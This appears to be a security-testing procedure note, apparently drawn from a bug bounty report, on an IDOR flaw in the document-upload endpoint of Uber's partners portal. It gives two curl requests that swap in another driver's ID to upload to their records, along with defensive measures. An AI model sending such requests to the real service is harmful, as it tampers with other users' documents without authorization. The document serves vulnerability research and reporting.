---
tags:
  - idor
  - discovery
  - web-testing
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-test-idor-upload]]'
verified: false
platforms:
  - Web
submitted: true
techniques:
  - '[[Account Discovery]]'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: acf4edf7-527c-4a8b-8aae-b1c1972ae88b
created_at: '2025-12-14T17:25:29.562Z'
updated_at: '2025-12-14T17:25:29.562Z'
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Identify-IDOR-in-Document-Upload-Endpoint

## Summary

This procedure tests the /p3/drivers/uploadDocument endpoint for Insecure Direct Object Reference (IDOR) vulnerabilities by attempting to manipulate documents belonging to other users in a multi-driver Uber account, revealing inadequate authorization checks.

## Description

In the context of Uber's partners.uber.com portal, driver accounts in multi-driver setups can access and modify documents for other drivers or the account admin due to missing permission validation. This procedure involves capturing and modifying upload requests to target unauthorized user IDs, confirming the IDOR. Prerequisites include a valid driver session and knowledge of target user IDs (e.g., from account listings). Expected outcomes include successful unauthorized uploads, indicating the flaw.

## Requirements

1. Authenticated driver account on partners.uber.com
2. Target user IDs (e.g., other drivers or admin)
3. Tools for request interception (browser dev tools or proxy)

## Defense

Defensive measures and detection strategies:

- Implement server-side authorization checks verifying user ownership of referenced objects
- Log and monitor upload requests for anomalous user ID patterns
- Use indirect object references (e.g., hashes) instead of direct IDs

## Objectives

1. Confirm IDOR by successfully uploading to unauthorized user documents
2. Document the lack of access controls for reporting
3. Assess potential for further exploitation like privilege escalation

## Instructions

### Step 1: Capture Legitimate Upload Request

**Context**: Start by performing a normal document upload as the authenticated driver to baseline the request format.

**Command** ([[commands/curl-test-idor-upload]]):
```bash
curl -X POST 'https://partners.uber.com/p3/drivers/uploadDocument' \
  -H 'Authorization: Bearer YOUR_DRIVER_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"driver_id": "OWN_DRIVER_ID", "document_type": "license", "file": "test_file.pdf"}'
```

> This sends a legitimate request; inspect the response (expect HTTP 200) and note the payload structure, especially the driver_id field.

### Step 2: Modify and Test with Target ID

**Context**: Alter the driver_id to a non-owned user (e.g., another driver in the multi-account) and resubmit to test for IDOR.

**Command** ([[commands/curl-test-idor-upload]]):
```bash
curl -X POST 'https://partners.uber.com/p3/drivers/uploadDocument' \
  -H 'Authorization: Bearer YOUR_DRIVER_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"driver_id": "TARGET_DRIVER_ID", "document_type": "license", "file": "test_file.pdf"}'
```

> If successful (no 403/401 error), the IDOR is confirmed; the endpoint processes the request without validating ownership.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Account Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/curl-test-idor-upload]]

## Tools Used


## Tags

- [[idor]]
- [[web]]
- [[Discovery]]
